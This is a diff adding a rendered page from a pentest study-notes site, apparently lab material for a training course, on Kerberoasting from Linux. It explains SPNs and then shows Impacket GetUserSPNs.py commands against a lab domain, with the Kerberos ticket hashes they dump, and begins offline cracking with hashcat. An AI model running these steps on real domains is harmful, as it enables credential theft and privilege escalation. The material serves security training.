+<li class="toctree-l1"><a class="reference internal" href="../../tags/ufw.html">ufw</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Python%20Uploadserver.html">Python Uploadserver</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20Bitsadmin%20to%20send%20and%20receive%20files.html">Using Bitsadmin to send and receive files</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20Certutil%20to%20download.html">Using Certutil to download</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20OpenSSL%20to%20send%20and%20receive%20files.html">Using OpenSSL to send and receive files</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Understanding%20User%20Privileges.html">Understanding User Privileges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Virtual%20Hosts.html">Virtual Hosts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/WAF.html">WAF</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wafw00f.html">wafw00f</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wappalyzer.html">wappalyzer</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/web%20shells.html">web shells</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Webdav.html">Webdav</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wget.html">wget</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/whatweb.html">whatweb</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/White%20Box%20Testing.html">White Box Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/whois.html">whois</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/windapsearch.html">windapsearch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20CMD.html">Windows CMD</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Lateral%20Movement.html">Windows Lateral Movement</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Local%20Password%20Attacks.html">Windows Local Password Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Pass%20The%20Hash.html">Windows Pass The Hash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Pass%20The%20Ticket.html">Windows Pass The Ticket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Passwords.html">Windows Passwords</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/winrm.html">winrm</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/WMI.html">WMI</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wmiexec.py.html">wmiexec.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wpscan.html">wpscan</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/xfreerdp.html">xfreerdp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/xxd.html">xxd</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Celestial Security Reference</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Kerberoasting - from Linux</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/CPTS/Initial Access/Kerberoasting - from Linux.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="kerberoasting-from-linux">
+<h1>Kerberoasting - from Linux<a class="headerlink" href="#kerberoasting-from-linux" title="Link to this heading"></a></h1>
+<p>Date: 2024-12-26 10:19:31</p>
+<p>Status: #new</p>
+<p>Tags: <a class="reference internal" href="Active%20Directory%20Enumeration%20Attacks.html#active-directory-enumeration-attacks"><span class="std std-ref">Active Directory Enumeration Attacks</span></a></p>
+<section id="description">
+<h2>Description<a class="headerlink" href="#description" title="Link to this heading"></a></h2>
+<section id="kerberoasting">
+<h3>Kerberoasting<a class="headerlink" href="#kerberoasting" title="Link to this heading"></a></h3>
+<p>kerberoasting is a lateral movement/escallation technique In Active Directory Domains.  Kerberoasting attacks SPN objects - often Domain accounts running services are often local administrators, if not highly privileged domain accounts.</p>
+</section>
+<section id="spn">
+<h3>SPN<a class="headerlink" href="#spn" title="Link to this heading"></a></h3>
+<p>A Service Principal Name is a concept from Kerberos. It’s an identifier for a particular service offered by a particular host within an authentication domain. The common form for SPNs is service <a class="reference external" href="mailto:class/fqdn&#37;&#52;&#48;REALM">class/fqdn<span>&#64;</span>REALM</a> (e.g. <a class="reference external" href="mailto:IMAP/mail&#46;example&#46;com&#37;&#52;&#48;EXAMPLE&#46;COM">IMAP/mail<span>&#46;</span>example<span>&#46;</span>com<span>&#64;</span>EXAMPLE<span>&#46;</span>COM</a>). There are also User Principal Names which identify users, in form of <a class="reference external" href="mailto:user&#37;&#52;&#48;REALM">user<span>&#64;</span>REALM</a> (or <a class="reference external" href="mailto:user1/user2&#37;&#52;&#48;REALM">user1/user2<span>&#64;</span>REALM</a>, which identifies a speaks-for relationship). The service class can loosely be thought of as the protocol for the service. The list of service classes that are built-in to Windows are listed in this article from Microsoft.</p>
+<p>Every SPN must be registered in the REALM’s Key Distribution Center (KDC) and issued a service key. The setspn.exe utility which is available in SupportTools folder on the Windows install media or as a Resource Kit download, manipulates assignments of SPNs to computer or other accounts in the AD.</p>
+<p>When a user accesses a service that uses Kerberos for authentication (a “Kerberized” service) they present an encrypted ticket obtained from KDC (in a Windows environment an Active Directory Domain Controller). The ticket is encrypted with the service key. By decrypting the ticket the service proves it possesses the key for the given SPN. Services running on Windows hosts use the key associated with AD computer account, but to be compliant with the Kerberos protocol SPNs must be added to the Active Directory for each kerberized service running on the host — except those built-in SPNs mentioned above. In the Active Directory the SPNs are stored in the servicePrincipalName attribute of the host’s computer object.</p>
+</section>
+</section>
+<section id="kerberoasting-performing-the-attack">
+<h2>Kerberoasting - Performing the attack<a class="headerlink" href="#kerberoasting-performing-the-attack" title="Link to this heading"></a></h2>
+<p>Kerberoasting can be performed on:</p>
+<ul class="simple">
+<li><p>A linux host with domain credentials</p></li>
+<li><p>A domain joined linux host with the root user and the keytab file</p></li>
+<li><p>a domain joined Windows host with a valid domain account.</p></li>
+<li><p>a Domain joined Windows host with a shell of a domain account</p></li>
+<li><p>as System on a domain joined host.</p></li>
+<li><p>From a non-domain joined Windows host using runas /netonly</p></li>
+</ul>
+<p>Tools used to perform this attack</p>
+<ul class="simple">
+<li><p><a class="reference internal" href="../../tags/getuserspns.py.html#getuserspns-py"><span class="std std-ref">getuserspns.py</span></a> by Impacket</p></li>
+<li><p><a class="reference internal" href="../../tags/mimikatz.html#mimikatz"><span class="std std-ref">mimikatz</span></a> also, builtin powershell (setspn.exe)</p></li>
+<li><p><a class="reference internal" href="../../tags/powerview.html#powerview"><span class="std std-ref">powerview</span></a></p></li>
+<li><p><a class="reference internal" href="../../tags/rubeus.html#rubeus"><span class="std std-ref">rubeus</span></a></p></li>
+</ul>
+</section>
+<section id="listing-spn-accounts-with-getuserspns-py">
+<h2>Listing SPN Accounts with GetUserSPNs.py<a class="headerlink" href="#listing-spn-accounts-with-getuserspns-py" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>INLANEFREIGHT.LOCAL/forend
+
+Impacket<span class="w"> </span>v0.9.25.dev1+20220208.122405.769c3196<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+
+Password:
+ServicePrincipalName<span class="w">                           </span>Name<span class="w">               </span>MemberOf<span class="w">                                                                                  </span>PasswordLastSet<span class="w">             </span>LastLogon<span class="w">  </span>Delegation
+---------------------------------------------<span class="w">  </span>-----------------<span class="w">  </span>----------------------------------------------------------------------------------------<span class="w">  </span>--------------------------<span class="w">  </span>---------<span class="w">  </span>----------
+backupjob/veam001.inlanefreight.local<span class="w">          </span>BACKUPAGENT<span class="w">        </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                       </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:15:40.842452<span class="w">  </span>&lt;never&gt;
+sts/inlanefreight.local<span class="w">                        </span>SOLARWINDSMONITOR<span class="w">  </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                       </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:14:48.701834<span class="w">  </span>&lt;never&gt;
+MSSQLSvc/SPSJDB.inlanefreight.local:1433<span class="w">       </span>sqlprod<span class="w">            </span><span class="nv">CN</span><span class="o">=</span>Dev<span class="w"> </span>Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                        </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:09:46.326865<span class="w">  </span>&lt;never&gt;
+MSSQLSvc/SQL-CL01-01inlanefreight.local:49351<span class="w">  </span>sqlqa<span class="w">              </span><span class="nv">CN</span><span class="o">=</span>Dev<span class="w"> </span>Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                        </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:10:06.545598<span class="w">  </span>&lt;never&gt;
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433<span class="w">  </span>sqldev<span class="w">             </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                       </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:13:31.639334<span class="w">  </span>&lt;never&gt;
+adfsconnect/azure01.inlanefreight.local<span class="w">        </span>adfs<span class="w">               </span><span class="nv">CN</span><span class="o">=</span>ExchangeLegacyInterop,OU<span class="o">=</span>Microsoft<span class="w"> </span>Exchange<span class="w"> </span>Security<span class="w"> </span>Groups,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">  </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:15:27.108079<span class="w">  </span>&lt;never&gt;
+</pre></div>
+</div>
+<p>To pull all tickets for offline crack processing with <a class="reference internal" href="../../tags/john.html#john"><span class="std std-ref">john</span></a> or <a class="reference internal" href="../../tags/hashcat.html#hashcat"><span class="std std-ref">hashcat</span></a></p>
+</section>
+<section id="requesting-all-tgs-tickets">
+<h2>Requesting all TGS Tickets<a class="headerlink" href="#requesting-all-tgs-tickets" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>INLANEFREIGHT.LOCAL/forend<span class="w"> </span>-request
+
+Impacket<span class="w"> </span>v0.9.25.dev1+20220208.122405.769c3196<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+
+Password:
+ServicePrincipalName<span class="w">                           </span>Name<span class="w">               </span>MemberOf<span class="w">                                                                                  </span>PasswordLastSet<span class="w">             </span>LastLogon<span class="w">  </span>Delegation
+---------------------------------------------<span class="w">  </span>-----------------<span class="w">  </span>----------------------------------------------------------------------------------------<span class="w">  </span>--------------------------<span class="w">  </span>---------<span class="w">  </span>----------
+backupjob/veam001.inlanefreight.local<span class="w">          </span>BACKUPAGENT<span class="w">        </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                       </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:15:40.842452<span class="w">  </span>&lt;never&gt;
+sts/inlanefreight.local<span class="w">                        </span>SOLARWINDSMONITOR<span class="w">  </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                       </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:14:48.701834<span class="w">  </span>&lt;never&gt;
+MSSQLSvc/SPSJDB.inlanefreight.local:1433<span class="w">       </span>sqlprod<span class="w">            </span><span class="nv">CN</span><span class="o">=</span>Dev<span class="w"> </span>Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                        </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:09:46.326865<span class="w">  </span>&lt;never&gt;
+MSSQLSvc/SQL-CL01-01inlanefreight.local:49351<span class="w">  </span>sqlqa<span class="w">              </span><span class="nv">CN</span><span class="o">=</span>Dev<span class="w"> </span>Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                        </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:10:06.545598<span class="w">  </span>&lt;never&gt;
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433<span class="w">  </span>sqldev<span class="w">             </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">                                       </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:13:31.639334<span class="w">  </span>&lt;never&gt;
+adfsconnect/azure01.inlanefreight.local<span class="w">        </span>adfs<span class="w">               </span><span class="nv">CN</span><span class="o">=</span>ExchangeLegacyInterop,OU<span class="o">=</span>Microsoft<span class="w"> </span>Exchange<span class="w"> </span>Security<span class="w"> </span>Groups,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">  </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:15:27.108079<span class="w">  </span>&lt;never&gt;
+
+<span class="nv">$krb5tgs$23$*</span>BACKUPAGENT<span class="nv">$INLANEFREIGHT</span>.LOCAL<span class="nv">$INLANEFREIGHT</span>.LOCAL/BACKUPAGENT*<span class="nv">$790</span>ae75fc53b0ace5daeb5795d21b8fe<span class="nv">$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d</span>
+<span class="nv">$krb5tgs$23$*</span>SOLARWINDSMONITOR<span class="nv">$INLANEFREIGHT</span>.LOCAL<span class="nv">$INLANEFREIGHT</span>.LOCAL/SOLARWINDSMONITOR*<span class="nv">$993</span>de7a8296f2a3f2fa41badec4215e1<span class="nv">$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30</span>
+&lt;SNIP&gt;
+</pre></div>
+</div>
+</section>
+<section id="requesting-a-single-tgs-ticket">
+<h2>Requesting a Single TGS ticket<a class="headerlink" href="#requesting-a-single-tgs-ticket" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>INLANEFREIGHT.LOCAL/forend<span class="w"> </span>-request-user<span class="w"> </span>sqldev
+
+Impacket<span class="w"> </span>v0.9.25.dev1+20220208.122405.769c3196<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+
+Password:
+ServicePrincipalName<span class="w">                           </span>Name<span class="w">    </span>MemberOf<span class="w">                                             </span>PasswordLastSet<span class="w">             </span>LastLogon<span class="w">  </span>Delegation
+---------------------------------------------<span class="w">  </span>------<span class="w">  </span>---------------------------------------------------<span class="w">  </span>--------------------------<span class="w">  </span>---------<span class="w">  </span>----------
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433<span class="w">  </span>sqldev<span class="w">  </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">  </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:13:31.639334<span class="w">  </span>&lt;never&gt;
+
+<span class="nv">$krb5tgs$23$*</span>sqldev<span class="nv">$INLANEFREIGHT</span>.LOCAL<span class="nv">$INLANEFREIGHT</span>.LOCAL/sqldev*<span class="nv">$4</span>ce5b71188b357b26032321529762c8a<span class="nv">$1</span>bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>To facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.</p>
+</div>
+</section>
+<section id="saving-the-tgs-ticket-to-an-output-file">
+<h2>Saving the TGS Ticket to an Output File<a class="headerlink" href="#saving-the-tgs-ticket-to-an-output-file" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>INLANEFREIGHT.LOCAL/forend<span class="w"> </span>-request-user<span class="w"> </span>sqldev<span class="w"> </span>-outputfile<span class="w"> </span>sqldev_tgs
+
+Impacket<span class="w"> </span>v0.9.25.dev1+20220208.122405.769c3196<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+
+Password:
+ServicePrincipalName<span class="w">                           </span>Name<span class="w">    </span>MemberOf<span class="w">                                             </span>PasswordLastSet<span class="w">             </span>LastLogon<span class="w">  </span>Delegation
+---------------------------------------------<span class="w">  </span>------<span class="w">  </span>---------------------------------------------------<span class="w">  </span>--------------------------<span class="w">  </span>---------<span class="w">  </span>----------
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433<span class="w">  </span>sqldev<span class="w">  </span><span class="nv">CN</span><span class="o">=</span>Domain<span class="w"> </span>Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>INLANEFREIGHT,DC<span class="o">=</span>LOCAL<span class="w">  </span><span class="m">2022</span>-02-15<span class="w"> </span><span class="m">17</span>:13:31.639334<span class="w">  </span>&lt;never&gt;
+</pre></div>
+</div>
+</section>
+<section id="cracking-the-ticket-offline-with-hashcat">
+<h2>Cracking the Ticket Offline with hashcat<a class="headerlink" href="#cracking-the-ticket-offline-with-hashcat" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>sqldev_tgs<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+
+hashcat<span class="w"> </span><span class="o">(</span>v6.1.1<span class="o">)</span><span class="w"> </span>starting...
+
+&lt;SNIP&gt;
+
